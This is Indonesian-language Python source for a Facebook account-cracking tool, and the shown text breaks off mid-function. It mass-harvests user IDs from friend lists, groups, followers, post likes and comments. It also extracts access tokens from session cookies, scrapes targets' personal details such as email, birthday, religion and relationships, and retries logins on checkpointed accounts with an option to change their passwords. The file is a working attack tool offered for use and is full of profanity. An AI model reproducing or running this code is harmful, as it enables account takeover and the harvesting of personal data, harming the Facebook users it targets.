#!/usr/bin/python3
#-*-coding:utf-8-*-
import os
try:
    import requests
except ImportError:
    print('\n [×] Modul requests belum terinstall!...\n')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n [×] Modul Futures belum terinstall!...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [×] Modul Bs4 belum terinstall!...\n')
    os.system('pip install bs4')
import requests, os, re, bs4, sys, json, time, random, datetime, subprocess
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,pwBaru=[],[]
ok,cp,id,loop = [],[],[],0
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan_key = {"january": "January", "february": "February", "march": "March", "april": "April", "may": "May", "june": "June", "july": "July", "august": "August", "september": "September", "october": "October", "november": "November", "december": "December"}
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
def logo():
    print("""%s
    \x1b[1;96m_________ __
   \x1b[1;96m/ ____/ (_) /____  | \x1b[1;97mCodeBy \x1b[1;96mSanz\x1b[1;97m-\x1b[1;96mTzy
  \x1b[1;96m/ __/ / / / __/ _ \ | \x1b[1;97mGithub \x1b[1;96m: \x1b[1;97mgithub.com/Sanz-Tzy
 \x1b[1;96m/ /___/ / / /_/  __/ | \x1b[1;97mFb \x1b[1;96m: \x1b[1;97mBintang Tzy
\x1b[1;96m/_____/_/_/\__/\___/  | \x1b[1;97mFb \x1b[1;96m: \x1b[1;97mfacebook.com/1000xxx
\x1b[1;97mMulti Brute Force
\033[92;1m----------------------------------------------------------
\033[97;1m \033[92;1mCreator  \033[97;1m: \033[93;1mSanz-Tzy \033[97;1mX \033[93;1mHaris Ganz
\033[97;1m \033[92;1mWhatsApp \033[97;1m: \033[93;1m083801xxxxx
\033[97;1m \033[92;1mGithub   \033[97;1m: \033[93;1mHttps://github.com/Sanz-Tzy
\033[97;1m \033[92;1mFacebook \033[97;1m: \033[93;1mBintang Tzy \033[97;1m[\033[92;1mFollow Me Facebook\033[97;1m]
\033[97;1m\033[92;1m       Crack Facebook random akan kaya teh hijau
\033[97;1m\033[93;1m---------------------------------------------------------
"""%(N))
# def banner_nano(
JECKO = "[++]"
JEECK = print
def banner():
# .  
    print(" %s \x1b[1;93mSilahkan login dulu lu ga login data hilang"%(JECKO))
    JEECK(" \x1b[1;96mASU NGENTOD ASU")
import requests,sys,os,time,json
from concurrent.futures import ThreadPoolExecutor as ThreadPool

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def _Yumasa_X_Nano_(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.04)



def login():
#    os.system('clear')
    banner()
    toket = input("\n[•] \x1b[1;93mToken : \x1b[1;97m")
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print('\n[•] \x1b[1;92mLogin Successful')
#        menu()
        target()
    except KeyError:
        print ("\n[!] \x1b[1;91mToken Invalid")
        os.system('clear')
        login()


def friend():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n[!] Token Invalid")
		os.system('rm -rf login.txt')
		login()
	try:
		limit = input("\n[•] Limit (Max 1000) : ")
		try:
			jok = requests.get("https://graph.facebook.com/me?access_token="+toket)
			op = json.loads(jok.text)
			print("[•] Name Account     : "+op["name"])
		except KeyError:
			print("\n[!] ID NOT found")
			print("\n[ Back ]")
			friend()
		r=requests.get("https://graph.facebook.com/me?fields=friends.limit("+limit+")&access_token="+toket)
		id = []
		z=json.loads(r.text)
		jalan("\n[•] Getting ID ...\n")
		qq = (op['first_name']+'.json').replace(" ","_")
		ys = open(qq , 'w')
		for a in z['friends']['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
			print(a['id']+" • "+a['name'])
		ys.close()
		print ('\n[•] Sukses Dump ID From %s'%op['name'])
		print ("[•] Total ID : %s"%(len(id)))
		print ("[•] Output   : %s"%qq)
		input("\n[ Back ]")
		
		
	except Exception as e:
		exit("[•] Error : %s"%e)

def public():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n[!] Token Invalid")
		os.system('rm -rf login.txt')
		login()
	try:
		idt = input("\n[•] ID Target        : ")
		limit = input("[•] Limit (Max 1000) : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print("[•] Name Account     : "+op["name"])
		except KeyError:
			print("\n[!] ID NOT found")
			print("\n[ Back ]")
			public()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit("+limit+")&access_token="+toket)
		id = []
		z=json.loads(r.text)
		jalan("\n[•] Getting ID ...\n")
		qq = (op['first_name']+'.json').replace(" ","_")
		ys = open(qq , 'w')
		for a in z['friends']['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
			print(a['id']+" • "+a['name'])
		ys.close()
		print ('\n[•] Sukses Dump ID From %s'%op['name'])
		print ("[•] Total ID : %s"%(len(id)))
		print ("[•] Output   : %s"%qq)
		input("\n[ Back ]")
		menu()
		
	except Exception as e:
		exit("[•] Error : %s"%e)

def followers():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n[!] Token Invalid")
		os.system('rm -rf login.txt')
		login()
	try:
		idt = input("\n[•] ID Target        : ")
		limit = input("[•] Limit (Max 1000) : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print("[•] Name Account     : "+op["name"])
		except KeyError:
			print("\n[!] ID NOT found")
			print("\n[ Back ]")
			followers()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+limit+"&access_token="+toket)
		id = []
		z=json.loads(r.text)
		jalan("\n[•] Getting ID ...\n")
		qq = (op['first_name']+'.json').replace(" ","_")
		ys = open(qq , 'w')
		for a in z['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
			print(a['id']+" • "+a['name'])
		ys.close()
		print ('\n[•] Sukses Dump ID From %s'%op['name'])
		print ("[•] Total ID : %s"%(len(id)))
		print ("[•] Output   : %s"%qq)
		input("\n[ Back ]")
		menu()
		
	except Exception as e:
		exit("[•] Error : %s"%e)

def target():
    try:
#       login()
#        toket=open('.cokie.txt').read()
        toket=open('login.txt','r').read()
    except KeyError:
        print("\n[!] Token Invalid")
        os.system('rm -rf login.txt')
        login()
    idt = input("\n[•] \x1b[1;93mID Target :\x1b[1;97m ")
    try:
        zx = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
        zy = json.loads(zx.text)
    except KeyError:
        print("\n[!] \x1b[1;91mID NOT found")
        print("\n\x1b[1;93m[\x1b[1;96m Back \x1b[1;93m]")
        menu()
    try:
        nm = zy["name"]
    except KeyError:
        nm = ("-")
    try:
        nd = zy["first_name"]
    except KeyError:
        nd = ("-")
    try:
        nt = zy["middle_name"]
    except KeyError:
        nt = ("-")
    try:
        nb = zy["last_name"]
    except KeyError:
        nb = ("-")
    try:
        ut = zy["birthday"]
    except KeyError:
        ut = ("-")
    try:
        gd = zy["gender"]
    except KeyError:
        gd = ("-")
    try:
        em = zy["email"]
    except KeyError:
        em = ("-")
    try:
        lk = zy["link"]
    except KeyError:
        lk = ("-")
    try:
        us = zy["username"]
    except KeyError:
        us = ("-")
    try:
        rg = zy["religion"]
    except KeyError:
        rg = ("-")
    try:
        rl = zy["relationship_status"]
    except KeyError:
        rl = ("-")
    try:
        rls = zy["significant_other"]["name"]
    except KeyError:
        rls = ("-")
    try:
        lc = zy["location"]["name"]
    except KeyError:
        lc = ("-")
    try:
        ht = zy["hometown"]["name"]
    except KeyError:
        ht = ("-")
    try:
        ab = zy["about"]
    except KeyError:
        ab = ("-")
    try:
        lo = zy["locale"]
    except KeyError:
        lo = ("-")
    _Yumasa_X_Nano_("[•] \x1b[1;97mName : " + nm)
    _Yumasa_X_Nano_("[•] \x1b[1;97mFirst Name : " + nd)
    _Yumasa_X_Nano_("[•]\x1b[1;97m Middle Name : " + nt)
    _Yumasa_X_Nano_("[•] \x1b[1;97mLast Name : " + nb)
    _Yumasa_X_Nano_("[•] \x1b[1;97mBirthday : " + ut)
    _Yumasa_X_Nano_("[•] \x1b[1;97mGender : " + gd)
    _Yumasa_X_Nano_("[•] \x1b[1;97mEmail : " + em)
    _Yumasa_X_Nano_("[•] \x1b[1;97mLink : " + lk)
    _Yumasa_X_Nano_("[•] \x1b[1;97mUsername : " + us)
    _Yumasa_X_Nano_("[•] \x1b[1;97mReligion : " + rg)
    _Yumasa_X_Nano_("[•] \x1b[1;97mRelationship Status : " + rl)
    _Yumasa_X_Nano_("[•] \x1b[1;97mRelationship With : " + rls)
    _Yumasa_X_Nano_("[•] \x1b[1;97mLocation : " + lc)
    _Yumasa_X_Nano_("[•] \x1b[1;97mHometown : " + ht)
    _Yumasa_X_Nano_("[•] \x1b[1;97mAbout : " + ab)
    _Yumasa_X_Nano_("[•] \x1b[1;97mLocale : " + lo)
    input("\n\x1b[1;93m[ \x1b[1;96mBack ]")
    moch_yayan


def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print('\n\n %s[%s#%s] \x1b[1;93mcrack selesai...\n'%(N,K,N))
        print(' [%s+%s] total OK : %s%s%s'%(O,N,H,str(len(ok)),N))
        print(' [%s+%s] total CP : %s%s%s'%(O,N,K,str(len(cp)),N))
        cek_cp = input(f"\n [{O}?{N}] \x1b[1;93mmunculkan opsi checkpoint detedtor [Y/t]: ")
        if cek_cp ==["Y","y"]:
            print(f"\n [{M}!{N}] \x1b[1;91mjangan kosong");hasil(ok,cp)
        elif cek_cp in["Y","y"]:
            jalan(f" [{M}!{N}] \x1b[1;96mhidupkan mode pesawat 3 detik terlebih dahulu.");time.sleep(5)
            ww=input(f"\n [{O}?{N}] \x1b[1;93mubah password ketika tap yes [Y/t]: ")
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" [{H}•{N}] \x1b[1;96mcontoh password : {H}Sanz-Tzy{N}")
                pwBar=input(f"\n [{H}+{N}] \x1b[1;93mmasukan password baru : ")
                print("\n")
                if len(pwBar) <= 5:
                    print('\n %s[%s×%s] \x1b[1;91mkata sandi minimal 6 karakter'%(N,M,N))
                else:
                    pwBaru.append(pwBar)
            for memek in cp:
                kontol = memek.replace('\n', '')
                titid  = kontol.split('|')
                print(f' {N}[{M}>{N}] \x1b[1;97mmencoba login ke akun : {K}{kontol.replace(" [×] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace(" [×] ", ""), titid[1])
                except requests.exceptions.ConnectionError:
                    continue
                print("")
            print("")
            print('   [ %s\x1b[1;93mProses Pengecekan Selesai %s]\n'%(H,N))
            input(' [ %s\x1b[1;96mKEMBALI%s ] '%(O,N));moch_yayan()
        elif cek_cp in["T","t"]:
            exit(f"\n  {O}*{N} \x1b[1;91mSelamat tinggal:)")
        else:
            print(f"\n [{M}!{N}] \x1b[1;91mY/t goblok");hasil(ok,cp)
    else:
        print('\n\n [%s!%s] \x1b[1;92mopshh kamu tidak mendapatkan hasil :('%(M,N));exit()
def yayanxd():
    os.system('clear')
    print (' %s*%s \x1b[1;97mtools ini menggunakan login cookies facebook.\n %s*%s \x1b[1;97mapakah kamu sudah tau cara mendapatkan cookies facebook?\n %s*%s \x1b[1;97mketik \x1b[1;93mopen \x1b[1;97muntuk mendapatkan cookies'%(O,N,O,N,O,N))
    cookie = input("\n %s[%s?%s] \x1b[1;97mCookies : %s"% (N,K,N,O))
    if cookie in['OPEN','Open','open']:
      jalan("\n  %s* %s\x1b[1;97manda akan di arahkan ke YouTube"%(O,H));time.sleep(3);os.system('xdg-open https://youtu.be/DF7bUCn0GFY');yayanxd()
    try:
        head={'Host':'business.facebook.com','cache-control':'max-age=0','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36','accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','content-type' : 'text/html; charset=utf-8','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cookie': cookie}
        asww=requests.get("https://business.facebook.com/creatorstudio/home", headers=head)
        reqq=re.search('{"accessToken":"(EAA\w+)', asww.text)
        tokn=reqq.group(1)
        open('.cokie.txt', 'a').write(cookie)
        open('.token.txt', 'a').write(tokn)
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(tokn)).json()['name']
        print('\n\n %s*%s \x1b[1;96mselamat datang %s%s%s'%(O,N,K,nama,N));time.sleep(1)
        print(' %s*%s \x1b[1;96mmohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...'%(O,N));time.sleep(1)
        input(' %s*%s \x1b[1;96mtekan enter '%(O,N))
        os.system('xdg-open https://youtube.com/channel/UCNvDaXoyAVCNJbSqtaXA-mg')
        moch_yayan()
    except AttributeError:
        print('\n %s[%s×%s] \x1b[1;91mcookies invalid'%(N,M,N));time.sleep(1);yayanxd()
    except UnboundLocalError:
        print('\n %s[%s×%s] \x1b[1;91mcookies invalid'%(N,M,N));time.sleep(1);yayanxd()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] \x1b[1;91mtidak ada koneksi\n'%(N,M,N))
def moch_yayan():
    os.system('clear')
    logo()
    try:
        kontol = open('.token.txt', 'r').read()
    except IOError:
        print('\n %s[%s×%s] \x1b[1;91mcookie invalid'%(N,M,N));time.sleep(2);os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt');yayanxd()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
    except KeyError:
        print('\n %s[%s×%s] \x1b[1;91mcookie invalid'%(N,M,N));time.sleep(2);os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt');yayanxd()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] \x1b[1;91mtidak ada koneksi\n'%(N,M,N))
    IP = requests.get('https://yayanxd.my.id/server/ip').text
    _mmk_ = open('.cokie.txt').read()
    kueh  = {"cookie":_mmk_}
    print(" \x1b[1;97m[•] IP Anda   : \x1b[1;96m%s"%(IP));time.sleep(0.03)
    print(" \x1b[1;97m[•] Nama Anda : %s%s%s\n"%(K,nama,N));time.sleep(0.03)
    print(' \x1b[1;93m[%s\x1b[1;96m01%s\x1b[1;93m] \x1b[1;97mmenu \x1b[1;93minstagram\x1b[1;96m(%s%s\x1b[1;96m)'%(O,N,H,N));time.sleep(0.03)
    print(' \x1b[1;93m[%s\x1b[1;96m02%s\x1b[1;93m] \x1b[1;97mCrack ID \x1b[1;93mdari teman publik'%(O,N));time.sleep(0.03)
    print(' \x1b[1;93m[%s\x1b[1;96m03%s\x1b[1;93m] \x1b[1;97mCrack ID \x1b[1;93mdari anggota grup'%(O,N));time.sleep(0.03)
    print(' \x1b[1;93m[%s\x1b[1;96m04%s\x1b[1;93m] \x1b[1;97mCrack ID \x1b[1;93mdari total followers'%(O,N));time.sleep(0.03)
    print(' \x1b[1;93m[%s\x1b[1;96m05%s\x1b[1;93m] \x1b[1;97mCrack ID \x1b[1;93mdari like postingan'%(O,N));time.sleep(0.03)
    print(' \x1b[1;93m[%s\x1b[1;96m06%s\x1b[1;93m] \x1b[1;97mCrack ID \x1b[1;93mdari random id massal'%(O,N));time.sleep(0.03)
    print(' \x1b[1;93m[%s\x1b[1;96m07%s\x1b[1;93m] \x1b[1;97mCrack ID \x1b[1;93mdari komentar postingan'%(O,N));time.sleep(0.03)
    print(' \x1b[1;93m[%s\x1b[1;96m08%s\x1b[1;93m] \x1b[1;96mCheckpoint detector'%(O,N));time.sleep(0.03)
    print(' \x1b[1;93m[%s\x1b[1;96m09%s\x1b[1;93m] \x1b[1;97mSettings U/A \x1b[1;93m[\x1b[1;96muser agent\x1b[1;93m]'%(O,N));time.sleep(0.03)
    print(' \x1b[1;93m[%s\x1b[1;96m10%s\x1b[1;93m] \x1b[1;97mCheck dari \x1b[1;96mhasil crack'%(O,N));time.sleep(0.03)
    print(' \x1b[1;93m[%s\x1b[1;96m11%s\x1b[1;93m] \x1b[1;96mGet data \x1b[1;96m[\x1b[1;93mTarget\x1b[1;96m]'%(O,N));time.sleep(0.03)
    print(' \x1b[1;93m[%s\x1b[1;91m00%s\x1b[1;93m] [%sDelete Cokies%s]'%(M,N,M,N));time.sleep(0.03)
    pepek = input('\n [%s*%s] menu : '%(H,N))
    if pepek == '':
        print('\n %s[%s×%s]\x1b[1;91m jangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
    elif pepek in['1','01']:
            log_igeh()
            menu_igeh()
    elif pepek in['2','02']:
        try:
            print("\n [*] \x1b[1;97mKetik \x1b[1;92m'me' \x1b[1;97mjika ingin crack dari daftar teman")
            user = input(' [*] \x1b[1;96mmasukan id atau username : ')
            _memek_ = __convert__(user)
            for a in requests.get('https://graph.facebook.com/%s/friends?limit=5000&access_token=%s'%(_memek_.get('_kontol_'),kontol)).json()["data"]:
                id.append(a['id'] + '<=>' + a['name'])
        except KeyError:
            print('\n %s[%s×%s] \x1b[1;91mgagal mengambil id, kemungkinan id tidaklah publik'%(N,M,N));time.sleep(3);moch_yayan()
    elif pepek in['3','03']:
        kontol = input(f"{N} [?] \x1b[1;93mmasukkan id grup : ")
        if kontol in[""," "]:
            print('\n %s[%s×%s] \x1b[1;91mjangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
        else:
            try:
                ajg=requests.get(f"https://mbasic.facebook.com/browse/group/members/?id={kontol}",cookies=kueh).text
                if "Halaman Tidak Ditemukan" in ajg:
                    print(f"\n %s[%s×%s] \x1b[1;93mgroup dengan id {kontol} tidak ditemukan"%(N,M,N));time.sleep(2);moch_yayan()
                elif "\x1b[1;93mAnda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
                    print("\n %s[%s×%s] \x1b[1;93mfacebook membatasi setiap aktivitas, limit bro, silahkan beralih akun"%(N,M,N));time.sleep(2);moch_yayan()
                elif "\x1b[1;91mKonten Tidak Ditemukan" in ajg:
                    print(f"\n %s[%s×%s] \x1b[1;93mgroup dengan id {kontol} tidak ditemukan"%(N,M,N));time.sleep(2);moch_yayan()
                else:
                    print(" [*] \x1b[1;96mnama grup : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0][8:])
                    print("\n [!] \x1b[1;96muntuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
                    crack_grup(f"https://mbasic.facebook.com/browse/group/members/?id={kontol}")
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                exit("\n [!] \x1b[1;91mKesalahan Pada Koneksi")
    elif pepek in['4','04']:
        kontol = input(f"{N} [?] \x1b[1;96mmasukan id atau username followers : ")
        if kontol in[""," "]:
            print('\n %s[%s×%s] \x1b[1;91mjangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
        try:
            print("\n [!] \x1b[1;93muntuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
            followers(f"https://mbasic.facebook.com/subscribe/lists/?id={kontol}")
        except KeyError:
            print(f"\n [!] \x1b[1;93mWhy {kontol} mikir dong tolol, masukin id postingan yang bener ngentod");time.sleep(2);moch_yayan()
    elif pepek in['5','05']:
        kontol = input(f"{N} [?] \x1b[1;96mmasukan id postingan : ")
        if kontol in[""," "]:
            print('\n %s[%s×%s] \x1b[1;91mjangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
        try:
            print("\n [!] \x1b[1;93muntuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
            like_post(f"https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier={kontol}")
        except KeyError:
            print(f"\n [!]\x1b[1;93m Why {kontol} mikir dong tolol, masukin id postingan yang bener ngentod");time.sleep(2);moch_yayan()
    elif pepek in['6','06']:
        _ngocok_(kontol)
    elif pepek in['11']:
        login()
        target()
    elif pepek in['7','07']:
        kontol = input(f"{N} [?] \x1b[1;93mmasukan id postingan : ")
        if kontol in[""," "]:
            print('\n %s[%s×%s]\x1b[1;91m jangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
        try:
            print("\n [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
            ngomen_post(f"https://mbasic.facebook.com/{kontol}")
        except KeyError:
            print(f"\n [!]\x1b[1;93m Why {kontol} mikir dong tolol, masukin id postingan yang bener ngentod");time.sleep(2);moch_yayan()
    elif pepek in['8','08']:
        gabut()
    elif pepek in['9','09']:
        seting_yntkts()
    elif pepek in['10']:
        dirs = os.listdir("results")
        print('\n \x1b[1;97m[ hasil crack yang tersimpan di file anda ]\n')
        for file in dirs:
            print(" [%s+%s] %s"%(O,N,file))
        file = input("\n [%s?%s] \x1b[1;96mmasukan nama file :%s "%(M,N,H))
        if file == "":
            file = input("\n %s[%s?%s]\x1b[1;96m masukan nama file :%s %s"%(N,M,N,H,N))
        total = open("results/%s"%(file)).read().splitlines()
        print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
        nm_file = ("%s"%(file)).replace("-", " ")
        hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "").replace("cp_detektor", "").replace("invalid_ok", "")
        jalan(" [%s*%s] Hasil %scrack%s pada tanggal %s:%s%s%s total %s: %s%s%s"%(M,N,O,N,M,O,hps_nm,N,M,O,len(total),O))
        print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
        for memek in total:
            kontol = memek.replace("\n","")
            titid  = kontol.replace(" [✓] "," \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ").replace(" [×] ", " \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
            print("%s%s"%(titid,N));time.sleep(0.03)
        print(" %s[%s#%s] --------------------------------------------"%(N,O,N))
        input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
    elif pepek in['0','00']:
        print("")
        titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
        for x in titik:
            sys.stdout.write('\r %s[%s+%s]\x1b[1;91m menghapus cookie %s'%(N,M,N,x)); sys.stdout.flush()
            time.sleep(1)
        os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt')
        exit('\n %s[%s✓%s]%s\x1b[1;91m berhasil menghapus cookie'%(N,M,N,H))
    else:
        print('\n %s[%s×%s]\x1b[1;93m menu [%s%s%s]\x1b[1;93m tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N));time.sleep(2);moch_yayan()
    if len(id)!=0:
        print("")
        return __crack__().plerr(id)
    else:
        print("\n %s[%s×%s] \x1b[1;91mgagal mengambil id, silahkan coba lagi"%(N,M,N));time.sleep(2);moch_yayan()
def seting_yntkts():
    print('\n (%s1%s) \x1b[1;93mganti user agent'%(O,N))
    print(' (%s2%s) \x1b[1;93mcheck user agent'%(O,N))
    ytbjts = input('\n %s[%s?%s] \x1b[1;96mchoose : '%(N,O,N))
    if ytbjts == '':
        print('\n %s[%s×%s] \x1b[1;91mGak boleh kosong Kentod'%(N,M,N));time.sleep(2);seting_yntkts()
    elif ytbjts in['1','01']:
        yo_ndak_tau_ko_tanya_saia()
    elif ytbjts in['2','02']:
        try:
            user_agent = open('YNTKTS.txt', 'r').read()
        except IOError:
            user_agent = '%s-'%(M)
        print('\n %s[%s+%s]\x1b[1;96m User Agent anda : %s%s'%(N,O,N,H,user_agent))
        input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
    else:
        print('\n %s[%s×%s]\x1b[1;91m input yang bener'%(N,M,N));time.sleep(2);seting_yntkts()
def yo_ndak_tau_ko_tanya_saia():
    os.system('rm -rf YNTKTS.txt')
    _asu_ = input('\n [%s?%s] \x1b[1;93mingin menggunakan user agent hp anda [Y/t]: '%(O,N))
    if _asu_ == '':
        print('\n %s[%s×%s] \x1b[1;91mGak boleh kosong Kentod'%(N,M,N));yo_ndak_tau_ko_tanya_saia()
    elif _asu_ in['Y','y']:
        jalan('\n %s *%s \x1b[1;93manda akan di arakan ke situs web setelah di arahkan ke situs web.\n  %s*%s \x1b[1;93mklik ikon %sMY USER AGENT%s\x1b[1;93m lalu copy semua user agent anda...'%(O,N,O,N,H,N));time.sleep(2);os.system('xdg-open https://www.yayanxd.my.id/server')
        _agen_ = input(' [%s?%s] \x1b[1;96mmasukan user agent hp anda :%s '%(O,N,H))
        open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
        jalan('\n %s[%s✓%s] \x1b[1;92mberhasil menggunakan user agent hp anda...'%(N,H,N))
        input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
    elif _asu_ in['T','t']:
        _agen_ = input(' [%s?%s] \x1b[1;96mmasukan user agent :%s '%(O,N,H))
        open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
        jalan('\n %s[%s✓%s] \x1b[1;92mberhasil mengganti user agent...'%(N,H,N))
        input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
    else:
        print('\n %s[%s!%s] \x1b[1;91mY/t ngentod'%(N,M,N));yo_ndak_tau_ko_tanya_saia()
def crack_grup(hencet):
    try:
        _mmk_ = open('.cokie.txt').read()
        kueh  = {"cookie":_mmk_}
        kontol=requests.get(hencet,cookies=kueh).text
        memek=re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',kontol)
        for softek in memek:
            if "profile.php?" in softek[0]:
                id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
            else:
                id.append(softek[0]+"<=>"+softek[1])
            sys.stdout.write('\r [*]\x1b[1;93m sedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
        if "Lihat Selengkapnya" in kontol:
            crack_grup(url_mb+BeautifulSoup(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
        else:
            def geh(gey):
                a=requests.get(gey,cookies=kueh).text
                b=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
                if len(b)!=0:
                    for c in b:
                        if "profile.php" in c[0]:
                            d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
                            if d in id:
                                continue
                            else:
                                id.append(d+"<=>"+c[1])
                        else:
                            d=re.search("(.*?)\?refid",c[0]).group(1)
                            if d in id:
                                continue
                            else:
                                id.append(d+"<=>"+c[1])
                        sys.stdout.write('\r [*] \x1b[1;93msedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
                if "Lihat Postingan Lainnya" in a:
                    geh(url_mb+BeautifulSoup(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
            geh(f"{url_mb}/groups/"+re.search("id=(\\d*)",hencet).group(1))
    except:pass
def like_post(hencet):
    try:
        _mmk_ = open('.cokie.txt').read()
        kueh  = {"cookie":_mmk_}
        kontol=requests.get(hencet,cookies=kueh).text
        if "Semua 0" in kontol:
            print("\n [!] \x1b[1;91mTidak ada yang menanggapi postingan, awokawokawok kasian akun nya sepi:v");time.sleep(2);moch_yayan()
        else:
            memek=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',kontol)
            for softek in memek:
                if "profile.php?" in softek[0]:
                    id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
                else:
                    id.append(re.findall("/(.*)",softek[0])[0]+"<=>"+softek[1])
                sys.stdout.write('\r [*]\x1b[1;93m sedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
            if "Lihat Selengkapnya" in kontol:
                like_post(url_mb+BeautifulSoup(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
    except:pass
def followers(hencet):
    try:
        _mmk_ = open('.cokie.txt').read()
        kueh  = {"cookie":_mmk_}
        kontol=requests.get(hencet,cookies=kueh).text
        memek = BeautifulSoup(kontol,'html.parser')
        for mmk in memek.find_all('a',href=True):
